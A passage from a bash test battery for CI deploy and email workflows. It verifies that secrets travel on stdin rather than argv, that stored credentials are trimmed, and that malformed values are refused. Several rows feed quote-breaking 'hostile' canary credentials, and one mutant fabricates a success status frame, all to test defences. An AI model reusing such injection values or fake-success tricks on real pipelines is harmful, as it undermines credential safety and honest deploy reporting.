if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 && "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $S4_GHS\"" ]] && s4_calls_ok 1 && s4_nowhere_on_argv "$S4_GHS" && s4_argv_has DELETE && ! s4_said '::warning'; then
  row "S4 row 5 apply-github-infra revoke: a well-formed run sends the installation token as the only stdin header (none on argv) and a 204 raises no warning" ok
else row "S4 row 5 apply-github-infra revoke: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_run r5-404 "$S4/b-r5.sh" "$S4/real" "${S4_BASE[@]}" SHIM_CODE=404
[[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 ]] && s4_said 'revoking the soleur-infra token returned HTTP 404' && row "S4 row 5 apply-github-infra revoke: a non-204 answer is the old warning (exit 0)" ok || row "S4 row 5 apply-github-infra revoke: non-204" fail "rc=$S4_RC"
s4_v_r5() { [[ "$S4_RC" == 0 && "$(s4_markers)" == 1 ]] && s4_said '::warning title=app-token-revoke::revoking the soleur-infra token returned HTTP 000' && ! s4_said 'revoking the soleur-infra token returned HTTP 204'; }
s4_sweep r5 "$S4/b-r5.sh" "$S4/real" s4_v_r5 "REVOKE_TOKEN" ""
s4_sweep_row "S4 row 5 apply-github-infra revoke (best effort): an empty, unset or hostile token reads as the old failed-revoke WARNING (HTTP 000, exit 0, never a failed job) with the marker once, zero requests and the canary absent"
s4_mutant_red "S4 row 5 apply-github-infra revoke control: a refusal swallowed into the SUCCESS code (|| code=204: the failed revoke raises no warning) is judged RED" "$REPO_ROOT/$S4_AGI" "Revoke the soleur-infra token" r5-swallow204 '|| code=000' '|| code=204' s4_v_r5 "REVOKE_TOKEN=${S4_CANARY}\"x"
s4_mutant_red "S4 row 5 apply-github-infra revoke control: a refusal swallowed into an EMPTY code (|| true: the warning no longer reads HTTP 000) is judged RED" "$REPO_ROOT/$S4_AGI" "Revoke the soleur-infra token" r5-swallowtrue '|| code=000' '|| true' s4_v_r5 "REVOKE_TOKEN=${S4_CANARY}\"x"
s4_run r5-nolib "$S4/b-r5.sh" "$S4/real" "${S4_BASE[@]}" GITHUB_WORKSPACE="$S4_EMPTYWS"
[[ "$S4_RC" == 0 && "$(s4_ncalls)" == 0 ]] && s4_said 'could not be loaded from the job checkout' && row "S4 row 5 apply-github-infra revoke: a checkout without the library warns and ends 0 (best effort), with zero requests and no argv fallback" ok || row "S4 row 5 apply-github-infra revoke: library absent" fail "rc=$S4_RC calls=$(s4_ncalls)"

# ---- row 3: deploy-inngest-image (INLINE wrapper; a dispatch-only job with no checkout). The trigger: a refusal is a RED step at the assignment (rc 2 under
# set -e), NOT the `Deploy webhook rejected (HTTP 000)` sentence, which would assert a cause nobody measured. The verify poll: the swallowed refusal ends in the
# poll's own timeout red, one marker per attempt. ----
S4_DII=".github/workflows/deploy-inngest-image.yml"
s4_body "$REPO_ROOT/$S4_DII" "Trigger deploy via webhook" "$S4/b-r3t.sh"
s4_body "$REPO_ROOT/$S4_DII" "Verify deploy completion" "$S4/b-r3v.sh" 'MAX_POLLS=120' 'MAX_POLLS=3'
S4_BASE=("${S4_WH_BASE[@]}" TAG=v1.2.3)
s4_run r3t-ok "$S4/b-r3t.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_wh_ok "$S4_ROW/calls/1.body" 1 && s4_said 'initiated (HTTP 202)' && grep -q '^TRIGGER_TS=' "$S4_ROW/genv" \
   && grep -qF 'deploy inngest ghcr.io/jikig-ai/soleur-inngest-bootstrap v1.2.3' "$S4_ROW/calls/1.body"; then
  row "S4 row 3 deploy-inngest-image trigger (inline): a well-formed run signs the body it sends (independent digest over the recorded bytes), carries the pair on stdin, none on any argv, and records TRIGGER_TS" ok
else row "S4 row 3 deploy-inngest-image trigger (inline): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
s4_v_r3t() { [[ "$S4_RC" != 0 && "$(s4_markers)" == 1 ]] && ! s4_said 'Deploy webhook rejected' && ! s4_said 'initiated (HTTP' && ! grep -q '^TRIGGER_TS=' "$S4_ROW/genv" \
  && s4_failmsg Deploy 2 && [[ "$S4_RC" == 2 ]]; }
s4_sweep r3t "$S4/b-r3t.sh" "$S4/real" s4_v_r3t "CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET" "WEBHOOK_SECRET"
s4_sweep_row "S4 row 3 deploy-inngest-image trigger (inline, red class): an empty, unset or hostile credential is a RED step with ONE marker and zero requests, never the 'Deploy webhook rejected (HTTP 000)' sentence, with no TRIGGER_TS written and the canary absent"
s4_nopy_row "S4 row 3 deploy-inngest-image trigger (inline HMAC site): python3 absent is RED with the marker and zero requests, never the 'rejected (HTTP 000)' sentence" "$S4/b-r3t.sh" s4_v_r3t
S4_SHIM="$S4/shimreal"; s4_run r3t-transport "$S4/b-r3t.sh" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
if [[ "$S4_RC" != 0 && "$(s4_markers)" == 0 ]] && ! s4_said 'initiated (HTTP' && s4_failmsg Deploy 7 && [[ "$S4_RC" == 7 ]]; then row "S4 row 3 deploy-inngest-image trigger: a REAL transport failure (closed port) is still RED and is not a refusal (no marker; the one failure line names rc=7 and the process exits with that code)" ok
else row "S4 row 3 deploy-inngest-image trigger: transport failure" fail "rc=$S4_RC markers=$(s4_markers)"; fi
S4_H0_BUILT=0; s4_body_try "$REPO_ROOT/$S4_DII" "Trigger deploy via webhook" "$S4/b-r3t-http000.sh" '"https://deploy.soleur.ai/hooks/deploy")' '"https://deploy.soleur.ai/hooks/deploy") || HTTP_CODE=000' && S4_H0_BUILT=1
if [[ "$S4_H0_BUILT" == 1 ]]; then s4_run ctl-r3t-http000 "$S4/b-r3t-http000.sh" "$S4/real" "${S4_BASE[@]}" "CF_ACCESS_CLIENT_ID=${S4_CANARY}\"x"; fi
if [[ "$S4_H0_BUILT" == 1 ]] && ! s4_v_r3t && s4_said 'Deploy webhook rejected (HTTP 000)'; then row "S4 row 3 deploy-inngest-image trigger control: mapping the refusal to HTTP_CODE=000 (|| HTTP_CODE=000) is judged RED (it prints the asserted-cause 'rejected (HTTP 000)' sentence)" ok
else row "S4 row 3 deploy-inngest-image trigger control: the HTTP_CODE=000 mutant is not judged red" fail "built=$S4_H0_BUILT rc=$S4_RC"; fi
# the verify poll (3 polls here): the swallowed refusal is the poll's OWN terminal red, one marker per attempt
s4_frame_dii="{\"component\":\"inngest\",\"exit_code\":0,\"reason\":\"success\",\"start_ts\":$((S4_NOW + 5))}"
S4_BASE=("${S4_WH_BASE[@]}" TAG=v1.2.3 TRIGGER_TS="$S4_NOW" "SHIM_STATUS_BODY=$s4_frame_dii")
s4_run r3v-ok "$S4/b-r3v.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && s4_said 'Inngest deploy v1.2.3 completed (reason=success)'; then
  row "S4 row 3 deploy-inngest-image verify (inline): a well-formed poll carries the digest over the empty body and the pair on stdin and reads this run's success frame" ok
else row "S4 row 3 deploy-inngest-image verify (inline): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
s4_v_r3v() { [[ "$S4_RC" != 0 && "$(s4_markers)" == 3 ]] && s4_said '::error::Deploy verify timed out after 15s' && ! s4_said 'completed (reason'; }
s4_sweep r3v "$S4/b-r3v.sh" "$S4/real" s4_v_r3v "CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET" "WEBHOOK_SECRET"
s4_sweep_row "S4 row 3 deploy-inngest-image verify (inline): an empty, unset or hostile credential is the poll's old terminal RED (timed out) with ONE marker per attempt (3 here), zero requests and the canary absent"
s4_nopy_row "S4 row 3 deploy-inngest-image verify (inline HMAC site): python3 absent reaches the same terminal red with the marker per attempt" "$S4/b-r3v.sh" s4_v_r3v
S4_FABRICATE=">/dev/null || printf '%s' '{\"exit_code\":0,\"component\":\"inngest\",\"reason\":\"success\",\"start_ts\":9999999999}' > /tmp/status-body"
s4_mutant_red "S4 row 3 deploy-inngest-image verify control: a refused status read swallowed into a fabricated SUCCESS frame (|| printf ... > status-body instead of || true) is judged RED (the step would report a deploy that was never checked)" "$REPO_ROOT/$S4_DII" "Verify deploy completion" r3v-fabricate '>/dev/null || true' "$S4_FABRICATE" s4_v_r3v "CF_ACCESS_CLIENT_ID=${S4_CANARY}\"x"

# ---- the inline sites' call-site TRIM (ADR-280, decision 7 for the inline form). Each inline-using step runs ONE line before the pinned guard that trims LEADING and TRAILING ASCII
# whitespace (space, tab, CR, LF, VT, FF; byte classes written out, never `[[:space:]]`, so the judgement does not follow the runner's locale) of the Cloudflare Access id and
# secret (the two email steps: of RESEND_API_KEY). The HMAC key is never trimmed. A stored value with a trailing newline or space is the commonest storage accident, and the old
# argv form tolerated a leading blank too (curl sent it and the edge discards leading whitespace of a field value). The loop's text is the CANONICAL spelling below; what the
# battery asserts about it is (a) a DERIVED population row (every step that defines the inline `_bearer_ok() {` and declares a GitHub `secrets.` value for one of the three names
# carries exactly that loop for exactly those names BEFORE the definition, and the eight hand-listed executed steps are that population), and (b) executed rows that DISCRIMINATE the
# shape: leading and trailing mixed whitespace trimmed and the clean value sent; interior space or LF refused (strip-all would send a different credential); an interior control
# byte, all-whitespace and U+2003 (leading, trailing, under a UTF-8 locale so a `[[:space:]]` implementation is seen) refused; the HMAC key untrimmed.
IFS= read -r -d '' s4_trim_py <<'PY' || true
import sys
WS = r"""$' \t\r\n\v\f'"""
kind, names = sys.argv[1], sys.argv[2]
lead = '_t="${_t#"${_t%%[!' + WS + ']*}"}"; '
trail = '_t="${_t%"${_t##*[!' + WS + ']}"}"; '
llead = '_t="${_t#"${_t%%[![:space:]]*}"}"; '
ltrail = '_t="${_t%"${_t##*[![:space:]]}"}"; '
body = {"canon": lead + trail, "lead": lead, "trail": trail, "locale": llead + ltrail,
        "stripall": '_t="${_t//[' + WS + ']/}"; ', "remove": ""}[kind]
print('for _v in ' + names + '; do _t="${!_v:-}"; ' + body + 'printf -v "$_v" \'%s\' "$_t"; done')
PY
# The derived population: workflow steps whose run body defines the inline `_bearer_ok() {` and whose effective env (workflow, job, step) declares a `secrets.` value for one of the
# three names. scan <root> prints "<file>\t<job>\t<step name>\t<step id>\t<names>\t<ok|BAD>" (ok: exactly one `for _v in` line precedes the definition and it IS the canonical loop for
# exactly those names); cover <root> <covered-file> prints UNCOVERED <file> <step> for a derived step no executed row names and STALE <entry> for an executed entry that is not derived.
IFS= read -r -d '' s4_b7_py <<'PY' || true
import sys, os, re, glob, subprocess, yaml
mode, root = sys.argv[1], sys.argv[2]
TV = ["CF_ACCESS_CLIENT_ID", "CF_ACCESS_CLIENT_SECRET", "RESEND_API_KEY"]
trim_py = os.environ["S4_TRIM_PY"]
def canon(names):
    return subprocess.run([sys.executable, "-I", "-c", trim_py, "canon", names], capture_output=True, text=True, check=True).stdout.strip()
rows = []
for path in sorted(glob.glob(os.path.join(root, ".github", "workflows", "*.yml"))):
    rel = os.path.relpath(path, root)
    d = yaml.safe_load(open(path))
    if not isinstance(d, dict): continue
    wenv = d.get("env") if isinstance(d.get("env"), dict) else {}
    for jid, j in (d.get("jobs") or {}).items():
        if not isinstance(j, dict): continue
        jenv = j.get("env") if isinstance(j.get("env"), dict) else {}
        for idx, s in enumerate(j.get("steps") or []):
            if not isinstance(s, dict) or not isinstance(s.get("run"), str): continue
            lines = [l.strip() for l in s["run"].split("\n")]
            di = next((i for i, l in enumerate(lines) if l.startswith("_bearer_ok() {")), None)
            if di is None: continue
            env = {}
            for e in (wenv, jenv, s.get("env") if isinstance(s.get("env"), dict) else {}): env.update(e)
            vs = [v for v in TV if "secrets." in str(env.get(v, ""))]
            if not vs: continue
            loops = [l for l in lines[:di] if l.startswith("for _v in ")]
            ok = loops == [canon(" ".join(vs))]
            rows.append((rel, jid, str(s.get("name") or ""), str(s.get("id") or ""), ",".join(vs), "ok" if ok else "BAD"))
if mode == "scan":
    for r in rows: print("\t".join(r))
else:
    cov = [l.rstrip("\n") for l in open(sys.argv[3]) if l.strip()]
    used = set()
    for rel, jid, name, sid, vs, st in rows:
        hit = [c for c in cov if c.split("|", 1)[0] == rel and (name.startswith(c.split("|", 1)[1]) or (sid and sid == c.split("|", 1)[1]))]
        used.update(hit)
        if not hit: print("UNCOVERED %s %s" % (rel, name or sid))
    for c in cov:
        if c not in used: print("STALE %s" % c)
PY
export S4_TRIM_PY="$s4_trim_py"
S4_B7_COVERED="$S4/b7-covered.txt"; : > "$S4_B7_COVERED"
S4_U2003=$'\xe2\x80\x83'
# The UTF-8 instrument: a `[[:space:]]` implementation only differs from the byte class under a UTF-8 locale, so the U+2003 rows run the step with LC_ALL=C.UTF-8 and need a bash
# that classifies U+2003 as space there (a locale-less host would let the locale-class mutant pass every row).
printf '%s\n' '[[ $'"'"'\xe2\x80\x83'"'"' == [[:space:]] ]] && echo yes' > "$S4/utf8probe.sh"
S4_UTF8_OK=0; [[ "$(env -i LC_ALL=C.UTF-8 "$BASH_BIN" --noprofile --norc "$S4/utf8probe.sh" 2>/dev/null)" == yes ]] && S4_UTF8_OK=1
[[ "$(env -i LC_ALL=C "$BASH_BIN" --noprofile --norc "$S4/utf8probe.sh" 2>/dev/null)" != yes ]] || S4_UTF8_OK=0   # the C locale must NOT classify it (the byte class and [[:space:]] must differ somewhere)
S4_B7_N=0; S4_B7_BAD=""
S4_B7_ID_MIX=$' \t'"${S4_CFID}"$' \t\r\n\v\f'; S4_B7_SEC_MIX=$'\r\n'"${S4_CFSEC}"$' '
S4_B7_ID_SP="${S4_CFID:0:8} ${S4_CFID:8}"; S4_B7_SEC_SP="${S4_CFSEC:0:8} ${S4_CFSEC:8}"; S4_B7_SEC_LF="${S4_CFSEC:0:8}"$'\n'"${S4_CFSEC:8}"
S4_B7_ID_X="${S4_CFID:0:8}"$'\001'"${S4_CFID:8}"; S4_B7_SEC_X="${S4_CFSEC:0:8}"$'\001'"${S4_CFSEC:8}"
S4_B7_KEY_NL="${S4_KEY}"$'\n'
S4_B7_SCEN_WH="trim interior-space interior-lf ctlbyte allws u2003 key"
S4_B7_SCEN_RS="trim interior-space ctlbyte allws u2003"
# s4_b7_refused <label> <body> <said> <mode> <NAME=value>...: the run makes ZERO requests, prints the marker, and does not reach the arm's success.
s4_b7_refused() {
  local l="$1" b="$2" s="$3" m="$4"; shift 4
  s4_run "$l" "$b" "$S4/real" "$@"; S4_REFUSAL_RUNS=$((S4_REFUSAL_RUNS + 1))
  [[ "$(s4_ncalls)" == 0 && "$(s4_markers)" -ge 1 ]] || return 1
  if [[ "$m" == resend-gho ]]; then ! s4_gho_has 'delivered=1'; elif [[ -n "$s" ]]; then ! s4_said "$s"; fi
}
# s4_b7_bad <tag> <body> <mode wh-post|wh-empty|resend-hdr|resend-gho> <said> "<scenarios>" <NAME=value>...: sets S4_B7_BAD to the NAMED scenarios that failed (empty = all held).
s4_b7_bad() {
  local tag="$1" body="$2" mode="$3" said="$4" scen="$5" sc f want got v; shift 5
  local -a base=("$@")
  S4_B7_BAD=""
  for sc in $scen; do
    case "$mode:$sc" in
      wh-*:trim)
        s4_run "b7-$tag-trim" "$body" "$S4/real" "${base[@]}" "CF_ACCESS_CLIENT_ID=$S4_B7_ID_MIX" "CF_ACCESS_CLIENT_SECRET=$S4_B7_SEC_MIX"
        f="$S4/bodies/empty"; [[ "$mode" == wh-post ]] && f="$S4_ROW/calls/1.body"
        { [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_wh_ok "$f" 1 && s4_said "$said"; } || S4_B7_BAD+=" trim(rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers))" ;;
      wh-*:interior-space)
        for v in "CF_ACCESS_CLIENT_ID=$S4_B7_ID_SP" "CF_ACCESS_CLIENT_SECRET=$S4_B7_SEC_SP"; do
          s4_b7_refused "b7-$tag-ctl-space" "$body" "$said" "$mode" "${base[@]}" "$v" || S4_B7_BAD+=" interior-space-${v%%=*}(calls=$(s4_ncalls) markers=$(s4_markers))"
        done ;;
      wh-*:interior-lf)
        s4_b7_refused "b7-$tag-ctl-lf" "$body" "$said" "$mode" "${base[@]}" "CF_ACCESS_CLIENT_SECRET=$S4_B7_SEC_LF" || S4_B7_BAD+=" interior-lf(calls=$(s4_ncalls) markers=$(s4_markers))" ;;
      wh-*:ctlbyte)
        for v in "CF_ACCESS_CLIENT_ID=$S4_B7_ID_X" "CF_ACCESS_CLIENT_SECRET=$S4_B7_SEC_X"; do
          s4_b7_refused "b7-$tag-ctlbyte" "$body" "$said" "$mode" "${base[@]}" "$v" || S4_B7_BAD+=" ctlbyte-${v%%=*}(calls=$(s4_ncalls) markers=$(s4_markers))"
        done ;;
      wh-*:allws)
        for v in "CF_ACCESS_CLIENT_ID=$S4_B7_ID_MIX_ALL" "CF_ACCESS_CLIENT_SECRET=$S4_B7_ID_MIX_ALL"; do
          s4_b7_refused "b7-$tag-ctl-allws" "$body" "$said" "$mode" "${base[@]}" "$v" || S4_B7_BAD+=" allws-${v%%=*}(calls=$(s4_ncalls) markers=$(s4_markers))"
        done ;;
      wh-*:u2003)
        if [[ "$S4_UTF8_OK" != 1 ]]; then S4_B7_BAD+=" u2003(no UTF-8 locale on this host: the [[:space:]] mutant would pass)"; continue; fi
        s4_b7_refused "b7-$tag-ctl-u2003t" "$body" "$said" "$mode" "${base[@]}" LC_ALL=C.UTF-8 "CF_ACCESS_CLIENT_ID=${S4_CFID}${S4_U2003}" || S4_B7_BAD+=" u2003-trailing(calls=$(s4_ncalls) markers=$(s4_markers))"
        s4_b7_refused "b7-$tag-ctl-u2003l" "$body" "$said" "$mode" "${base[@]}" LC_ALL=C.UTF-8 "CF_ACCESS_CLIENT_SECRET=${S4_U2003}${S4_CFSEC}" || S4_B7_BAD+=" u2003-leading(calls=$(s4_ncalls) markers=$(s4_markers))" ;;
      wh-*:key)
        s4_run "b7-$tag-key" "$body" "$S4/real" "${base[@]}" "WEBHOOK_SECRET=$S4_B7_KEY_NL"
        f="$S4/bodies/empty"; [[ "$mode" == wh-post ]] && f="$S4_ROW/calls/1.body"
        want="$(s4_oracle "$S4_B7_KEY_NL" "$f")"; got="$(s4_oracle "$S4_KEY" "$f")"
        { [[ "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 && -n "$want" && "$want" != "$got" && "$(s4_stdin_line 1 1)" == "header = \"X-Signature-256: sha256=$want\"" ]] && s4_nowhere_on_argv "$want"; } || S4_B7_BAD+=" key-not-trimmed(calls=$(s4_ncalls) markers=$(s4_markers))" ;;
      resend-*:trim)
        s4_run "b7-$tag-trim" "$body" "$S4/real" "${base[@]}" "RESEND_API_KEY=${S4_B7_RS_MIX}"
        { [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 && "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $S4_RESEND\"" ]] && s4_calls_ok 1 && s4_nowhere_on_argv "$S4_RESEND"; } || S4_B7_BAD+=" trim(rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers))"
        if [[ "$mode" == resend-gho ]]; then s4_gho_has 'delivered=1' || S4_B7_BAD+=" not-delivered"; else s4_said "$said" || S4_B7_BAD+=" no-success-line"; fi ;;
      resend-*:interior-space)
        s4_b7_refused "b7-$tag-ctl-space" "$body" "$said" "$mode" "${base[@]}" "RESEND_API_KEY=${S4_RESEND:0:6} ${S4_RESEND:6}" || S4_B7_BAD+=" interior-space(calls=$(s4_ncalls) markers=$(s4_markers))" ;;
      resend-*:ctlbyte)
        s4_b7_refused "b7-$tag-ctlbyte" "$body" "$said" "$mode" "${base[@]}" "RESEND_API_KEY=${S4_RESEND:0:6}"$'\001'"${S4_RESEND:6}" || S4_B7_BAD+=" ctlbyte(calls=$(s4_ncalls) markers=$(s4_markers))" ;;
      resend-*:allws)
        s4_b7_refused "b7-$tag-ctl-allws" "$body" "$said" "$mode" "${base[@]}" "RESEND_API_KEY=$S4_B7_ID_MIX_ALL" || S4_B7_BAD+=" allws(calls=$(s4_ncalls) markers=$(s4_markers))" ;;
      resend-*:u2003)
        if [[ "$S4_UTF8_OK" != 1 ]]; then S4_B7_BAD+=" u2003(no UTF-8 locale on this host: the [[:space:]] mutant would pass)"; continue; fi
        s4_b7_refused "b7-$tag-ctl-u2003t" "$body" "$said" "$mode" "${base[@]}" LC_ALL=C.UTF-8 "RESEND_API_KEY=${S4_RESEND}${S4_U2003}" || S4_B7_BAD+=" u2003-trailing(calls=$(s4_ncalls) markers=$(s4_markers))"
        s4_b7_refused "b7-$tag-ctl-u2003l" "$body" "$said" "$mode" "${base[@]}" LC_ALL=C.UTF-8 "RESEND_API_KEY=${S4_U2003}${S4_RESEND}" || S4_B7_BAD+=" u2003-leading(calls=$(s4_ncalls) markers=$(s4_markers))" ;;
      *) S4_B7_BAD+=" unknown-scenario($mode:$sc)" ;;
    esac
  done
}
S4_B7_ID_MIX_ALL=$' \t\r\n\v\f'
S4_B7_RS_MIX=$'\t '"${S4_RESEND}"$' \r\n'
s4_b7_step() { # <tag> <body> <mode> <said> <NAME=value>...: one of the eight executed inline steps, every scenario
  local tag="$1" body="$2" mode="$3" said="$4" scen="$S4_B7_SCEN_WH"; shift 4
  [[ "$mode" == resend-* ]] && scen="$S4_B7_SCEN_RS"
  S4_B7_N=$((S4_B7_N + 1)); printf '%s\n' "${S4_BODY_SRC[$body]:-unbuilt|$body}" >> "$S4_B7_COVERED"
  s4_b7_bad "$tag" "$body" "$mode" "$said" "$scen" "$@"
  if [[ -z "$S4_B7_BAD" ]]; then row "S4 inline trim $tag: leading and trailing ASCII whitespace (space, tab, CR, LF, VT, FF) of the stored credential is trimmed at the call site and the clean value is what is sent; interior space or LF, an interior control byte, all-whitespace and U+2003 (leading and trailing, under a UTF-8 locale) are still refused$([[ "$mode" == wh-* ]] && echo ", and the HMAC key is NOT trimmed (it signs as the exact key it was given)")" ok
  else row "S4 inline trim $tag: the call-site trim, an interior/non-ASCII refusal or the untrimmed key" fail "$S4_B7_BAD"; fi
}
S4_B7_REL=("${S4_WH_BASE[@]}" "${S4_REL_ENV[@]}")
mapfile -t S4_PEER_JOBENV < <(s4_jobenv "$REPO_ROOT/$S4_WFR" verify-peer-deploy)
S4_B7_PEERREL=("${S4_WH_BASE[@]}" "${S4_PEER_JOBENV[@]}" VERSION=1.2.3)
S4_B7_BASE_DEPLOY=("${S4_B7_REL[@]}" WEB_HOST_PRIVATE_IPS=10.0.1.10,10.0.1.11)
S4_B7_BASE_FAILMAIL=(MIRROR_VERIFIED=true RUN_URL=https://example.invalid/run VERSION=1.2.3 SHIM_PROFILE=generic)
s4_b7_step release-lock-probe "$S4/b-r8.sh" wh-empty 'Pre-rerun probe: no in-flight deploy (exit_code=0)' "${S4_WH_BASE[@]}" "${S4_REL_JOBENV[@]}" 'SHIM_STATUS_BODY={"exit_code":0}'
s4_b7_step release-deploy "$S4/b-r9.sh" wh-post 'Deploy initiated (HTTP 202)' "${S4_B7_BASE_DEPLOY[@]}"
s4_b7_step release-verify "$S4/b-r10.sh" wh-empty 'ci-deploy.sh completed successfully for v1.2.3' "${S4_B7_REL[@]}" STATUS_POLL_MAX_ATTEMPTS=3 STATUS_POLL_INTERVAL_S=0 'SHIM_STATUS_BODY={"exit_code":0,"reason":"ok","tag":"v1.2.3"}'
s4_b7_step release-peer-verify "$S4/b-r10p.sh" wh-empty 'All expected peers reported v1.2.3 deploy completion' "${S4_B7_PEERREL[@]}" STATUS_POLL_MAX_ATTEMPTS=3 STATUS_POLL_INTERVAL_S=0 'SHIM_STATUS_BODY={"exit_code":0,"reason":"ok","tag":"v1.2.3","peers":{"10.0.1.11":{"exit_code":0,"reason":"ok","tag":"v1.2.3"}}}'
s4_b7_step release-deploy-failed-email "$S4/b-r11.sh" resend-hdr 'Deploy-failure email sent to ops@jikigai.com (HTTP 200)' "${S4_B7_BASE_FAILMAIL[@]}"
s4_b7_step release-outcome-email "$S4/b-r12.sh" resend-gho '' CLASSIFIER=failure FAILED=live-verify 'FAILED_HTML=<li>live-verify</li>' R_DEPLOY=failure TAG=v1.2.3 VERSION=1.2.3 RUN_URL=https://example.invalid/run SHIM_PROFILE=generic
s4_b7_step deploy-inngest-trigger "$S4/b-r3t.sh" wh-post 'initiated (HTTP 202)' "${S4_WH_BASE[@]}" TAG=v1.2.3
s4_b7_step deploy-inngest-verify "$S4/b-r3v.sh" wh-empty 'Inngest deploy v1.2.3 completed (reason=success)' "${S4_WH_BASE[@]}" TAG=v1.2.3 TRIGGER_TS="$S4_NOW" "SHIM_STATUS_BODY=$s4_frame_dii"

# POPULATION: the executed steps above ARE the derived population (no hand list can drift from the YAML), the count is held to a floor, and the derivation is fed a must-FAIL
# fixture (a step that defines the inline guard and declares the secret but has no trim loop, one whose loop comes after the definition, one that trims the wrong names, a job-level
# secret) and must-PASS controls (a canonical step; steps outside the population: a definer without a secret, a secret without a definer).
S4_B7_DERIVED="$(cd "$REPO_ROOT" && python3 -I -c "$s4_b7_py" scan "$REPO_ROOT")"
S4_B7_DERIVED_N="$(grep -c . <<<"$S4_B7_DERIVED" || true)"; S4_B7_BADN="$(grep -c $'\tBAD$' <<<"$S4_B7_DERIVED" || true)"
S4_B7_COVER="$(cd "$REPO_ROOT" && python3 -I -c "$s4_b7_py" cover "$REPO_ROOT" "$S4_B7_COVERED")"
S4_B7_FLOOR=8
if [[ "$S4_B7_BADN" == 0 && -z "$S4_B7_COVER" && "$S4_B7_DERIVED_N" == "$S4_B7_N" && "$S4_B7_DERIVED_N" -ge "$S4_B7_FLOOR" ]]; then
  row "S4 inline trim population: every workflow step that defines the inline _bearer_ok and declares a secrets.* value for CF_ACCESS_CLIENT_ID, CF_ACCESS_CLIENT_SECRET or RESEND_API_KEY carries exactly the canonical trim loop for exactly those names before the definition, and the $S4_B7_N executed rows are exactly that derived population ($S4_B7_DERIVED_N steps; floor $S4_B7_FLOOR)" ok
else row "S4 inline trim population: a derived step lacks the canonical trim, no executed row covers it, or the population is below its floor" fail "bad=$S4_B7_BADN derived=$S4_B7_DERIVED_N executed=$S4_B7_N floor=$S4_B7_FLOOR cover='${S4_B7_COVER//$'\n'/;}' bad-steps='$(grep $'\tBAD$' <<<"$S4_B7_DERIVED" | cut -f1,3 | tr '\t\n' ': ;')'"; fi
S4_B7F="$S4/b7fix"; assert_fixture_dir "$S4_B7F"
s4_b7_fix() { # <name> <env block> <run-body prelude> : writes <name>/.github/workflows/w.yml
  local t="$S4_B7F/$1"; assert_fixture_dir "$t"; mkdir -p "$t/.github/workflows"
  { printf '%s\n' 'name: fixture' 'on: push' "$3" 'jobs:' '  j:' '    runs-on: ubuntu-latest'
    printf '%s\n' "$4" '    steps:' '      - name: fixture step'; printf '%s\n' "$2"; printf '%s\n' '        run: |' "$5" '          _bearer_ok() { :; }'; } > "$t/.github/workflows/w.yml"
  printf '%s' "$t"
}
S4_B7_CANON2="$(python3 -I -c "$s4_trim_py" canon 'CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET')"
S4_B7_ENV2=$'        env:\n          CF_ACCESS_CLIENT_ID: ${{ secrets.CF_ACCESS_CLIENT_ID }}\n          CF_ACCESS_CLIENT_SECRET: ${{ secrets.CF_ACCESS_CLIENT_SECRET }}'
S4_B7_F_OK="$(s4_b7_fix ok "$S4_B7_ENV2" '' '' "          $S4_B7_CANON2")"
S4_B7_F_NOLOOP="$(s4_b7_fix noloop "$S4_B7_ENV2" '' '' '          echo hi')"
S4_B7_F_WRONG="$(s4_b7_fix wrongnames "$S4_B7_ENV2" '' '' "          $(python3 -I -c "$s4_trim_py" canon 'CF_ACCESS_CLIENT_ID')")"
S4_B7_F_REMOVED="$(s4_b7_fix removed "$S4_B7_ENV2" '' '' "          $(python3 -I -c "$s4_trim_py" remove 'CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET')")"
S4_B7_F_JOB="$(s4_b7_fix jobenv $'        env:\n          X: y' '' $'    env:\n      CF_ACCESS_CLIENT_ID: ${{ secrets.A }}' '          echo hi')"
S4_B7_F_NOSECRET="$(s4_b7_fix nosecret $'        env:\n          CF_ACCESS_CLIENT_ID: ${{ vars.CF_ACCESS_CLIENT_ID }}' '' '' '          echo hi')"
s4_b7_after() {
  local t="$S4_B7F/after"
  assert_fixture_dir "$t"
  mkdir -p "$t/.github/workflows"
  {
    printf '%s\n' 'name: fixture' 'on: push' 'jobs:' '  j:' '    runs-on: ubuntu-latest' '    steps:' '      - name: fixture step'
    printf '%s\n' "$S4_B7_ENV2"
    printf '%s\n' '        run: |' '          _bearer_ok() { :; }' "          $S4_B7_CANON2"
  } > "$t/.github/workflows/w.yml"
  printf '%s' "$t"
}
S4_B7_F_AFTER="$(s4_b7_after)"
s4_b7_status() { python3 -I -c "$s4_b7_py" scan "$1" | cut -f6 | paste -sd,; }
S4_B7_FX_BAD=""
[[ "$(s4_b7_status "$S4_B7_F_OK")" == ok ]] || S4_B7_FX_BAD+=" ok-fixture($(s4_b7_status "$S4_B7_F_OK"))"
for fx in NOLOOP WRONG REMOVED JOB AFTER; do
  fxv="S4_B7_F_$fx"; fxd="${!fxv}"; [[ "$(s4_b7_status "$fxd")" == BAD ]] || S4_B7_FX_BAD+=" $fx($(s4_b7_status "$fxd"))"
done
